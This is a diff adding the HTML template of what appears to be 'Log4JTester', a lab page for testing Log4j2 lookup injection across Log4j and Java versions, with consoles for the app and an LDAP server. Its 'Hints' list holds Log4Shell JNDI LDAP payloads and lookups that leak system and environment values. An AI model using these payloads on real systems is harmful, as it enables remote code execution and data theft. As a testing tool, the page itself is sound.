@@ -1,0 +1,144 @@
+<!doctype html>
+<html lang="en" data-framework="intercoolerjs">
+<head>
+    <meta charset="utf-8">
+    <title>Log4JTester</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/css/index.css">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+</head>
+
+<body>
+<div class="container-fluid">
+    <div class="row">
+            <div class="col-5">
+
+                <div class="card" >
+                    <div class="card-body">
+                        <h5 class="card-title">Application</h5>
+                        <div class="ratio ratio-21x9">
+                            <iframe src="http://localhost:9999" title="Application">
+                            </iframe>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card" >
+                    <div class="card-body">
+                        <h5 class="card-title">Hints</h5>
+
+                        <ul class="list-group">
+                            <li class="list-group-item">&#36;{sys:java.version}</li>
+                            <li class="list-group-item">&#36;{sys:java.class.path}</li>
+                            <li class="list-group-item">&#36;{sys:java.home}</li>
+                            <li class="list-group-item">&#36;{log4j:configLocation}</li>
+                            <li class="list-group-item">&#36;{env:USER}</li>
+                            <li class="list-group-item">&#36;{docker:containerId}</li>
+                            <li class="list-group-item">&#36;{jndi:ldap://${ldapaddr}:1389/a}</li>
+                            <li class="list-group-item">&#36;{jndi:ldap://${ldapaddr}:1389/cn=version,dc=example,dc=org}</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="card">
+                    <div class="card-body">
+                        <h5 class="card-title">Available Log4J2 Versions</h5>
+                        <div id="versions-1">
+                            #parse("/velocity/versions.vm")
+                        </div>
+
+                    </div>
+                </div>
+                <div class="card">
+                    <div class="card-body">
+                        <h5 class="card-title">Available Java Versions</h5>
+                        <div id="versions-2">
+                            #parse("/velocity/javalevels.vm")
+                        </div>
+
+                    </div>
+                </div>
+                <div class="card">
+                    <div class="card-body">
+                        <h5 class="card-title">Properties</h5>
+                        <div id="properties">
+                            #parse("/velocity/properties.vm")
+                        </div>
+
+                    </div>
+                </div>
+                <div class="card">
+                    <div class="card-body">
+                        <button ic-post-to="/clear" class="button btn-danger float-right">Clear Consoles</button>
+
+                    </div>
+                </div>
+        </div>
+        <div class="col-7">
+            <div class="row">
+
+                <div class="col-12">
+                    <div class="card" >
+                        <div class="card-body">
+                            <h5 class="card-title">Application Console(s)</h5>
+
+
+                            <ul class="nav nav-pills mb-3" id="pills-tab" role="tablist">
+                                #foreach($c in $consoles)
+                                <li class="nav-item" role="presentation">
+                                    <button class="nav-link #if( $velocityCount==1 ) active #end" id="console-${c.handle}-tab" data-bs-toggle="pill" data-bs-target="#console-${c.handle}" type="button" role="tab" aria-controls="pills-home" aria-selected="true">${c.name}</button>
+                                </li>
+                                #end
+                            </ul>
+
+
+                            <div class="tab-content">
+                                #foreach($c in $consoles)
+
+                                <div class="tab-pane fade #if( $velocityCount==1 ) show active #end console" id="console-${c.handle}" role="tabpanel">
+                                    <div class="console" id='console-${c.handle}-main' ic-get-from="/views/console/${c.name}" ic-target="#target-span-$velocityCount"></div>
+                                    <div>
+                                        <div id="target-span-$velocityCount">
+                                            #parse("/velocity/console.vm")
+                                        </div>
+                                    </div>
+
+                                </div>
+                               #end
+                            </div>
+
+
+                        </div>
+                    </div>
+                    #foreach($c in $servers)
+                    <div class="card" >
+                        <div class="card-body">
+                            <h5 class="card-title">$c.name Console</h5>
+                            <div  class="console" id='console-ldap-main' ic-get-from="/views/console/$c.handle" ic-target="#target-span-$c.handle"></div>
+                            <div>
+                                <div id="target-span-$c.handle">
+                                    #parse("/velocity/console.vm")
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    #end
+                </div>
+
+
+
+
+            </div>
+        </div>
+    </div>
+
+</div>
+
+<div>
+
+</div>
+<script src="/js/vendor/jquery-1.12.4.min.js"></script>
+<script src="/js/vendor/intercooler-0.9.6.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
+<script src="js/wshandler.js"></script>
+</body>
+</html>
